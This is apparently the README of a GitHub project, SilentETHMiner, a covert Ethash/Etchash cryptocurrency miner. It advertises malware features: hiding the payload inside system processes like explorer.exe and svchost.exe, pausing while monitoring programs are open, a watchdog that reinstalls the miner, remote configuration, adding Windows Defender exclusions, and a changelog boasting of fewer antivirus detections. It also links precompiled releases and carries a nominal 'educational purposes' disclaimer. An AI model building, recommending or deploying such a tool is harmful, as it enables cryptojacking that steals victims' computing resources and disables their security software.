
<img src="https://github.com/UnamSanctam/SilentETHMiner/blob/master/SilentETHMiner.png?raw=true">

# SilentETHMiner v1.5.4 - Based on Lime Miner v0.3

Can mine any Ethash or Etchash cryptocurrency.

## Main Features

* .NET - Coded in C#, requires .NET Framework 4.5
* Injection (Silent/Hidden) - Hide payload behind another process like explorer.exe, conhost.exe, svchost.exe or some other process
* Idle Mining - Can be configured to mine at different usages or not at all while computer is or isn't in use
* Stealth - Pauses the miner and clears the GPU memory while any of the programs in the "Stealth Targets" option are open
* Watchdog - Replaces the miner file if removed and starts it if the injected miner is closed down
* Ethash/Etchash - Supports mining all Ethash/Etchash coins like Ethereum, Ethereum Classic, Etho, Metaverse, Ellaism, QuarkChain and others
* Remote Configuration - Can get the miner settings remotely from a URL every 100 minutes
* Bypass Windows Defender - Adds exclusions into Windows Defender for the general folders the miner uses
* Online Downloader - Can download the miner binary during runtime to greatly decrease file size and detections

## Downloads

Pre-Compiled: https://github.com/UnamSanctam/SilentETHMiner/releases

## My Other Miners

[Silent XMR (Monero) Miner](https://github.com/UnamSanctam/SilentXMRMiner)

## Wiki

You can find the new wiki [here](https://github.com/UnamSanctam/SilentETHMiner/wiki) or at the top of the page.

## Mining Requirements

When mining with the Ethash or the Etchash algorithm you need to have enough GPU memory left to store the DAG. So for example, mining Ethereum requires you to have at least a minimum GPU memory of 4.4 GB available since that is the size of the DAG as of writing this. Due to this, GPUs that have less available memory than the required DAG are not able to mine at all. You can mine Ethash/Etchash cryptocurrencies that have a lower DAG size like Ethereum Classic (ETC). 
The other thing required is a recent enough CUDA or OpenCL compatible driver for your GPU.

So the requirements are as follow:
1. Enough GPU memory for the DAG
2. Supported drivers

## Changelog

### v1.5.4 (28/07/2021)
* Fixed the GPU detection for systems that have custom lowercase characters like Turkish, seems like I failed the "Turkey Test" again
### v1.5.3 (19/07/2021)
* Hotfix (20/07/2021): Fixed compatibility for some AMD cards and newer AMD drivers
* Greatly reduced Windows Defender detections when "Bypass Windows Defender" is enabled by replacing Assembly.Load with simply writing the payload to Temp and executing it since the folders are excluded
* Fixed the paths for systems that have custom lowercase characters like Turkish

[You can view the full Changelog here](CHANGELOG.md)

## Author

* **Unam Sanctam**
* Credit to **NYAN CAT** 


## Disclaimer

I, the creator, am not responsible for any actions, and or damages, caused by this software.

You bear the full responsibility of your actions and acknowledge that this software was created for educational purposes only.

This software's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.

By using this software, you automatically agree to the above.

## License

This project is licensed under the MIT License - see the [LICENSE](/LICENSE) file for details

